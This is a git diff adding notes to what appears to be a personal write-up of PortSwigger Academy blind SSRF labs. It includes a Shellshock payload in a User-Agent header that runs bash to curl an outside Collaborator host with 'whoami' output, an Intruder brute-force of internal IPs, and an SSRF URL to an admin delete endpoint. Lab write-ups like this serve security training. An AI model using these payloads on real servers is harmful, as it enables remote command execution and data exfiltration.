@@ -59,7 +59,31 @@ stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?usernam
 ```
 
 #### Blind SSRF with out-of-band detection
-TODO
+- change referer header to collab
+```
+Referer: http://...oastify.com
+```
 
 #### Blind SSRF with Shellshock exploitation
-TODO
+- https://github.com/DrHaitham/CVE-2014-6271-Shellshock-
+- idea:
+  - use referer to brute and request internal server
+  - use shelshock to curl collab with whoami
+```
+GET /product?productId=2 HTTP/2
+Host: ...web-security-academy.net
+...
+User-Agent: () { :; }; echo; echo BurpTest; /bin/bash -c "curl http://$(whoami).COLLAB.oastify.com"
+...
+Referer: http://192.168.0.§1§:8080
+...
+```
+- using intruder brute all IPs and find request with whoami
+
+or
+- In Burp Suite Professional, install the Collaborator Everywhere extension from the BApp Store. 
+- Add the domain of the lab to Burp Suite's target scope, so that Collaborator Everywhere will target it. 
+- Browse the site. 
+- Observe that when you load a product page, it triggers an HTTP interaction with Burp Collaborator, via the Referer 
+  header. 
+- then repeat attack using intruder
